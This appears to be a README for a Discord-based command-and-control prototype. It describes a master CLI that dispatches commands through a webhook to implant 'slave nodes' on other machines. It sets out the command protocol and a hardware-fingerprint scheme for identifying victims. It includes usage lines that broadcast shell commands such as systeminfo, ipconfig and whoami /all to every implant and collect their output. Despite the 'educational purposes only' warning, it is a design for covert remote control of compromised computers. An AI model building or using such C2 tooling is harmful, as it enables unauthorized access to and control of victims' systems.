# Discord-Based Command & Control (C2) Prototype

**⚠️ WARNING: FOR EDUCATIONAL PURPOSES ONLY**  
This project demonstrates security concepts and should never be used for malicious purposes. Unauthorized use may violate Discord's ToS and applicable laws.

## Overview

A proof-of-concept demonstrating how Discord's API could theoretically be abused for command and control operations. The system consists of:

- **Master Controller**: CLI tool for issuing commands
- **Slave Nodes**: Implant agents that execute commands
- **Communication Protocol**: Discord channels + webhooks

## Protocol Design

### Communication Flow
1. **Master → Slave**: Commands sent via Discord webhook
   - Format: `[TARGET_ID] [COMMAND]`
   - Example: `a1b2c3d4 whoami /all`

2. **Slave → Master**: Responses posted in Discord channel
   - Format: 
     ```
     [SYSTEM_ID]
     [COMMAND_OUTPUT]
     ```

### Unique Identification
Each slave generates a unique ID by hashing system characteristics:
```python
SHA256(
    hostname + 
    OS_version + 
    CPU_info + 
    MAC_address + 
    primary_disk
)[:8]
Key Components
Slave Features
System fingerprinting

Command execution (30s timeout)

Output sanitization (1900 char limit)

Target filtering (* for broadcast)

Master Features
Targeted command dispatch

Response monitoring

Webhook integration

CLI interface

Prerequisites
Software Requirements
Python 3.8+

Discord developer account

Bot token with message permissions

Setup Commands
bash
Copy
# Install dependencies
pip install -r requirements.txt

# Configure environment
export DISCORD_TOKEN="your_bot_token"
export WEBHOOK_URL="your_webhook_url"
Usage Examples
Broadcast command to all slaves:

bash
Copy
python master.py send --target * --command "systeminfo"
Target specific slave:

bash
Copy
python master.py send --target a1b2c3d4 --command "ipconfig"
Monitor responses:

bash
Copy
python master.py monitor
